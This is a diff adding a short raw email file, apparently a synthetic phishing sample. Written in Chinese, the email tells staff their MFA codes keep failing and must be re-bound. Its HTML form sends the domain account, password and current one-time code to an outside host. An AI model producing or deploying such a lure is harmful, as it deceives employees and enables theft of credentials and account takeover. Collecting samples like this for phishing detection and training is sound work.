@@ -1,0 +1,10 @@
+From: =?utf-8?B?5Y+M5Zug57Sg6K6k6K+B?= <otp@mfa-gate2.example>
+To: staff@corp.internal
+Date: Mon, 07 Sep 2026 09:22:00 +0800
+Message-ID: <0012-b15@synth.example>
+Subject: MFA 验证码过期，请重新绑定
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+
+<html><body><p>您的 MFA 验证码多次失效，需重新绑定令牌：</p><form action='https://mfa-rebind2.example.net/b'><input name='acct' placeholder='域账号'> <input name='pwd' type='password' placeholder='密码'> <input name='otp' placeholder='当前 6 位验证码'> <button>重新绑定</button></form></body></html>
